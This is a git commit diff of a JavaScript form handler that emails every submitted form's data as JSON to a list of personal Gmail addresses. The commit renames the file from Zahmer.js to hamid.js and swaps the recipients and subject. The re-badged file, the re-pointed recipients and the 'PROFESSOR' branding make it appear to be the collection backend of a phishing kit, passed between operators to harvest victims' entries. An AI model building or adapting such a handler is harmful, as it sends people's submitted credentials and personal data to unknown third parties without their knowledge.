224064963a6276bc25fbfc9fa5f0f3e79ee7b996
zm9807350 <zm9807350@gmail.com>
2025-12-22 09:38:01 +0500

    Update and rename Zahmer.js to hamid.js

--- hamid.js
+++ hamid.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,newzatpage@gmail.com,submitdispute@gmail.com,amiyaaana939@gmail.com",
-      subject: "Zahmer",
+      to: "linkquarry@gmail.com,fahadali123gg@gmail.com,hamidnizamani87@gmail.com",
+      subject: "Hamid",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Asif Link</h3><pre>${JSON.stringify(
         formData,
